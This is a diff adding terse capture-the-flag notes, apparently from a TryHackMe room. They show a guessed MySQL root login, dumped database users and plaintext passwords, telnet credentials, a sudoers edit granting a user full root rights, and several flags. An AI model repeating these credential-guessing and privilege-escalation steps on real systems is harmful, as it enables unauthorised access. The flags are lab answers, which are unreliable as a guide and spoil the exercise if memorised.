@@ -1,0 +1,80 @@
+	
+mysql -u root -h 10.10.224.237 -p
+
+(guessing passwd is root)
+
+
+mysql_native_password | 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | root
+
+
+
+MySQL [(none)]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| users              |
++--------------------+
+
+
+
+
+
+$use users;
+
+
+
+$select * from User;
++----------+---------------------------------------+
+| username | password                              |
++----------+---------------------------------------+
+| ramen    | noodlesRTheBest                       |
+| flag     | thm{2f30841ff8d9646845295135adda8332} |
++----------+---------------------------------------+
+2 rows in set (0.214 sec)
+
+MySQL [users]>
+
+
+
+
+$use mysql;
+
+$select * from user;
+
+
+
+
+
+
+telnet
+
+user:food
+passwd:givemecookies
+
+
+
+
+
+/home/bread
+thm{7baf5aa8491a4b7b1c2d231a24aec575}
+
+
+
+sudo vi /etc/sudoers 
+ramen	ALL=(ALL:ALL) ALL
+
+
+
+/root
+thm{9f1ee18d3021d135b03b943cc58f34db}
+
+
+/home/tryhackme
+thm{5a926ab5d3561e976f4ae5a7e2d034fe}
+
+
+
